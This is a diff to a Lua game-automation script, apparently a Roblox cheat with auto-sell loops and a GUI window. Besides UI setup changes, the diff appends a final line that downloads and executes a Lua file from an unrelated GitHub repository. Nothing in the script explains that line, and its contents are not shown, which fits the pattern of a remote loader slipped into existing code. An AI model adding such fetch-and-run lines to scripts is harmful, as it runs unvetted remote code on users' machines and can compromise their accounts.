@@ -299,9 +299,15 @@ local function Main()
         MakeLoop(auto and autosell, AutoSellCheck)
         MakeLoop(auto,checksummer())
 end
+local InsertService = game:GetService("InsertService")
+
 --// Window
 local ReGui = loadstring(game:HttpGet('https://raw.githubusercontent.com/depthso/Dear-ReGui/refs/heads/main/ReGui.lua'))()
+local PrefabsId = "rbxassetid://" .. ReGui.PrefabsId
 
+ReGui:Init({
+	Prefabs = InsertService:LoadLocalAsset(PrefabsId)
+})
 local function CreateWindow()
 	local Window = ReGui:Window({
 		Title = `{GameInfo.Name} | Depso`,
@@ -310,7 +316,7 @@ local function CreateWindow()
 	})
 	return Window
 end
---repeat task.wait() until game:IsLoaded()
+-- repeat task.wait() until game:IsLoaded()
 
 local Window = CreateWindow()
 
@@ -321,3 +327,4 @@ auto = AutoMation:Checkbox({
 	Label = "Enabled"
 })
 Main()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/JordiTBA/script/refs/heads/main/a.lua'))()
